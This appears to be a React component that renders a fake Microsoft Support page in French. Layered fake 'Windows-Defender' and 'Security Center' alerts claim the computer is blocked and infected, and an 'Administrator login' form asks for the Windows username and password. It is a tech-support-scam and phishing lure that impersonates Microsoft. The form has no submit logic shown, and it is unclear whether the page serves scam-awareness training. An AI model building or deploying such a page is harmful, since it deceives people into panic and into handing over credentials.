'use client';

import React, { useState } from 'react';

export default function WindowsSecurityPage() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  return (
    <div className="fixed inset-0 z-[200] bg-[#f5f5f5] overflow-hidden select-none">
      {/* Background - Microsoft Support Website */}
      <div className="absolute inset-0 bg-white">
        {/* Microsoft Header */}
        <div className="h-12 bg-white border-b border-gray-200 flex items-center justify-between px-6">
          <div className="flex items-center gap-4">
            <div className="flex items-center gap-2">
              <svg className="w-5 h-5" viewBox="0 0 23 23">
                <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
                <rect x="12" y="1" width="10" height="10" fill="#7fba00"/>
                <rect x="1" y="12" width="10" height="10" fill="#00a4ef"/>
                <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
              </svg>
              <span className="font-semibold text-gray-800">Microsoft</span>
            </div>
            <span className="text-gray-400">|</span>
            <span className="text-gray-600 text-sm">Support technique</span>
          </div>
          <div className="flex items-center gap-6 text-sm text-gray-600">
            <span className="hover:underline cursor-pointer">Tout Microsoft ∨</span>
            <span className="hover:underline cursor-pointer flex items-center gap-1">
              Rechercher
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
              </svg>
            </span>
            <span className="hover:underline cursor-pointer">Se connecter</span>
            <div className="w-8 h-8 rounded-full border border-gray-300 flex items-center justify-center">
              <svg className="w-5 h-5 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
              </svg>
            </div>
          </div>
        </div>
        
        {/* Sub Navigation */}
        <div className="h-10 bg-white border-b border-gray-200 flex items-center px-6 gap-6 text-sm text-gray-600">
          <span className="hover:underline cursor-pointer">Produits ∨</span>
          <span className="hover:underline cursor-pointer">Appareils ∨</span>
          <span className="hover:underline cursor-pointer">Nouveautés ∨</span>
          <span className="hover:underline cursor-pointer">Microsoft 365</span>
        </div>

        {/* Blue Banner */}
        <div className="h-[280px] bg-[#0078d4] flex items-center justify-center px-8">
          <p className="text-white text-lg text-center max-w-4xl leading-relaxed">
            Ouckiér ées·réfuneţ eb: vóas prowées à.&apos;asssister ıratrҹe, et pooxàr íntormation-de ·saletés.
          </p>
        </div>

        {/* Content Area */}
        <div className="flex px-8 py-8">
          {/* Left Content */}
          <div className="flex-1">
            <h2 className="text-2xl font-semibold text-gray-800 mb-2">Sélectionnez le produit</h2>
            <p className="text-sm text-gray-600 mb-8">
              Nous vous montrerons d&apos;abourt les·optionc·d&apos; assistance disperible:<br/>
              Microsoft.
            </p>
            
            {/* Product Grid - First Row */}
            <div className="grid grid-cols-4 gap-8 mb-8">
              <div className="flex flex-col items-center cursor-pointer">
                <div className="w-16 h-16 mb-3 flex items-center justify-center">
                  <svg className="w-12 h-12" viewBox="0 0 23 23">
                    <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
                    <rect x="12" y="1" width="10" height="10" fill="#7fba00"/>
                    <rect x="1" y="12" width="10" height="10" fill="#00a4ef"/>
                    <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
                  </svg>
                </div>
                <span className="text-sm text-gray-700">Microsoft 365</span>
              </div>
              <div className="flex flex-col items-center cursor-pointer">
                <div className="w-16 h-16 mb-3 flex items-center justify-center">
                  <svg className="w-14 h-14" viewBox="0 0 96 96" fill="none">
                    <path d="M48 12L12 84h72L48 12z" fill="#0078d4"/>
                    <path d="M48 12L12 84h36V12z" fill="#50e6ff"/>
                    <path d="M48 44L28 84h40L48 44z" fill="#fff"/>
                  </svg>
                </div>
                <span className="text-sm text-gray-700">Azure</span>
              </div>
              <div className="flex flex-col items-center cursor-pointer">
                <div className="w-16 h-16 mb-3 flex items-center justify-center">
                  <svg className="w-12 h-12" viewBox="0 0 48 48">
                    <path d="M24 4C12.954 4 4 12.954 4 24s8.954 20 20 20 20-8.954 20-20S35.046 4 24 4z" fill="#0078d4"/>
                    <path d="M30 16c0-3.314-2.686-6-6-6s-6 2.686-6 6c0 3.314 2.686 6 6 6s6-2.686 6-6z" fill="#fff"/>
                    <path d="M24 26c-6.627 0-12 3.582-12 8v4h24v-4c0-4.418-5.373-8-12-8z" fill="#fff"/>
                  </svg>
                </div>
                <span className="text-sm text-gray-700">Intune</span>
              </div>
            </div>

            {/* Second Row */}
            <div className="flex gap-8 mb-8">
              <div className="flex flex-col items-center cursor-pointer">
                <div className="w-16 h-16 mb-3 flex items-center justify-center">
                  <div className="w-12 h-12 bg-[#0078d4] rounded flex items-center justify-center text-white font-bold text-2xl">A</div>
                </div>
                <span className="text-sm text-gray-700">Microsoft aznsts</span>
              </div>
            </div>

            {/* Bottom Links */}
            <div className="flex gap-12 text-sm text-gray-600">
              <span className="hover:underline cursor-pointer">Produits serveur</span>
              <span className="hover:underline cursor-pointer">Accessoires PC</span>
              <span className="hover:underline cursor-pointer">Publicité</span>
            </div>
          </div>

          {/* Right Sidebar */}
          <div className="w-[280px] ml-8">
            <h3 className="text-lg font-semibold text-gray-800 mb-2">Anniversaires</h3>
            <p className="text-sm text-gray-600 mb-6">Béaning ou mornéous pour parler à des spécialistes</p>
            
            <div className="grid grid-cols-2 gap-4">
              <div className="flex flex-col items-center cursor-pointer">
                <div className="w-12 h-12 mb-2 bg-[#7b83eb] rounded flex items-center justify-center">
                  <svg className="w-6 h-6 text-white" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zM9 17H7v-7h2v7zm4 0h-2V7h2v10zm4 0h-2v-4h2v4z"/>
                  </svg>
                </div>
                <span className="text-xs text-gray-700">Microsoft 365</span>
              </div>
              <div className="flex flex-col items-center cursor-pointer">
                <div className="w-12 h-12 mb-2 border border-[#0078d4] rounded flex items-center justify-center">
                  <svg className="w-6 h-6 text-[#0078d4]" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                  </svg>
                </div>
                <span className="text-xs text-gray-700">Intune</span>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Microsoft Support Chat Widget */}
      <div className="absolute bottom-20 right-8 w-[200px] bg-white rounded-lg shadow-xl border border-gray-200 z-30">
        <div className="p-4 flex items-center gap-3">
          <svg className="w-8 h-8" viewBox="0 0 23 23">
            <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
            <rect x="12" y="1" width="10" height="10" fill="#7fba00"/>
            <rect x="1" y="12" width="10" height="10" fill="#00a4ef"/>
            <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
          </svg>
          <div>
            <p className="font-semibold text-gray-800 text-sm">Microsoft</p>
            <p className="text-xs text-gray-500">Microsoft Support</p>
          </div>
        </div>
      </div>

      {/* Bottom Windows Security Bar */}
      <div className="absolute bottom-0 left-0 right-0 h-10 bg-[#0078d4] flex items-center justify-center gap-4 z-50">
        <div className="flex items-center gap-2">
          <svg className="w-4 h-4" viewBox="0 0 23 23">
            <rect x="1" y="1" width="10" height="10" fill="#fff"/>
            <rect x="12" y="1" width="10" height="10" fill="#fff"/>
            <rect x="1" y="12" width="10" height="10" fill="#fff"/>
            <rect x="12" y="12" width="10" height="10" fill="#fff"/>
          </svg>
          <span className="text-white text-sm font-medium">Windows Security</span>
        </div>
        <span className="text-white text-sm">Microsoft Support</span>
        <span className="text-white animate-pulse">|</span>
      </div>

      {/* Small warning text at very bottom */}
      <div className="absolute bottom-10 left-0 right-0 bg-[#fff3cd] text-[9px] text-gray-700 text-center py-0.5 z-40">
        Defender SmartScreen now prevents unrecognized apps from appearing. Running this tool could put your Computer at risk. Windows detected Antivirus enhanced malware that can st
      </div>

      {/* ============ CENTERED MODALS CONTAINER ============ */}
      <div className="absolute inset-0 flex items-center justify-center z-40 pointer-events-none">
        <div className="relative w-[600px] h-[500px] pointer-events-auto">
          
          {/* System Protection Window - Back */}
          <div className="absolute -left-20 -top-16 w-[550px] bg-[#f0f0f0] border border-gray-400 shadow-xl rounded-sm">
            {/* Title Bar */}
            <div className="h-8 bg-[#0078d4] flex items-center px-3 gap-2">
              <svg className="w-4 h-4" viewBox="0 0 23 23">
                <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
                <rect x="12" y="1" width="10" height="10" fill="#7fba00"/>
                <rect x="1" y="12" width="10" height="10" fill="#00a4ef"/>
                <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
              </svg>
              <span className="text-white text-sm font-medium">System Protection</span>
              <div className="ml-auto flex">
                <button className="w-11 h-7 flex items-center justify-center text-white hover:bg-white/20">─</button>
                <button className="w-11 h-7 flex items-center justify-center text-white hover:bg-white/20">□</button>
                <button className="w-11 h-7 flex items-center justify-center text-white hover:bg-red-500">✕</button>
              </div>
            </div>
            
            {/* Menu Bar */}
            <div className="h-8 bg-white border-b border-gray-300 flex items-center px-2 gap-1">
              <button className="px-3 py-1 text-xs hover:bg-gray-100 rounded flex items-center gap-1">
                <span>📁</span> Diagnose
              </button>
            </div>
            
            {/* Red Warning Banner */}
            <div className="bg-[#c42b1c] text-white p-3">
              <h3 className="text-lg font-bold text-center">Windows-Defender</h3>
              <p className="text-sm text-center">Access to this system has been blocked for security reasons</p>
            </div>
            
            {/* Content */}
            <div className="p-4 bg-white">
              <h4 className="text-xl text-[#0078d4] font-medium mb-2">Regretfully, the assessment is not concluded</h4>
              <p className="text-sm text-gray-600 mb-2">Problem:</p>
              <p className="text-sm text-gray-600 mb-4">Potentially malicious software has been detected on your system.</p>
              <p className="text-sm text-[#0078d4] underline cursor-pointer mb-2">Get in touch for help</p>
              <p className="text-sm text-gray-600">System Support:</p>
            </div>
            
            {/* Bottom Bar */}
            <div className="h-10 bg-[#f0f0f0] border-t border-gray-300 flex items-center justify-between px-4">
              <div className="flex items-center gap-2">
                <svg className="w-5 h-5" viewBox="0 0 23 23">
                  <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
                  <rect x="12" y="1" width="10" height="10" fill="#7fba00"/>
                  <rect x="1" y="12" width="10" height="10" fill="#00a4ef"/>
                  <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
                </svg>
                <span className="text-xs">Workstation<br/>Safety</span>
              </div>
              <button className="bg-[#c42b1c] text-white px-6 py-1.5 rounded text-sm font-medium hover:bg-[#a82315]">
                Audit
              </button>
            </div>
          </div>

          {/* Security Center Window - Middle */}
          <div className="absolute left-0 top-8 w-[450px] bg-white border border-gray-400 shadow-xl">
            {/* Title Bar */}
            <div className="h-7 bg-[#ececec] border-b border-gray-300 flex items-center px-2">
              <div className="flex items-center gap-2">
                <div className="w-4 h-4 bg-[#0078d4] rounded-sm flex items-center justify-center">
                  <span className="text-white text-xs">🛡️</span>
                </div>
                <span className="text-sm">Security Center</span>
              </div>
              <div className="ml-auto flex">
                <button className="w-6 h-6 flex items-center justify-center text-gray-600 hover:bg-gray-200 text-xs">─</button>
                <button className="w-6 h-6 flex items-center justify-center text-gray-600 hover:bg-gray-200 text-xs">□</button>
                <button className="w-6 h-6 flex items-center justify-center text-red-600 hover:bg-red-100 font-bold">✕</button>
              </div>
            </div>
            
            {/* Content */}
            <div className="p-6 text-center">
              <h3 className="text-[#0078d4] text-xl mb-4">Regretfully, the assessment is not concluded</h3>
            </div>
          </div>

          {/* Administrator Login Modal - Front/Center */}
          <div className="absolute left-12 top-24 w-[380px] bg-white border border-gray-300 shadow-2xl">
            {/* Title Bar */}
            <div className="h-10 bg-[#f5f5f5] border-b border-gray-200 flex items-center justify-center relative">
              <span className="text-sm font-semibold text-gray-800">Administrator login</span>
              <button className="absolute right-2 w-7 h-7 flex items-center justify-center text-red-500 hover:bg-red-50 rounded font-bold text-lg">
                X
              </button>
            </div>
            
            {/* Content */}
            <div className="p-6">
              <p className="text-sm text-gray-700 text-center mb-1">Windows has been blocked due to suspicious activity.</p>
              <p className="text-sm text-gray-700 text-center mb-1">Try logging in again with your Windows account and password.</p>
              <p className="text-sm text-gray-700 text-center mb-6">If you need help , contact Windows Support.</p>
              
              <div className="space-y-4">
                <input
                  type="text"
                  placeholder="Username"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 rounded text-sm focus:outline-none focus:border-blue-500"
                />
                <input
                  type="password"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 rounded text-sm focus:outline-none focus:border-blue-500"
                />
                <button className="w-full bg-[#0078d4] text-white py-2.5 rounded text-sm font-medium hover:bg-[#006cbd]">
                  Login
                </button>
              </div>
            </div>
          </div>

        </div>
      </div>
    </div>
  );
}
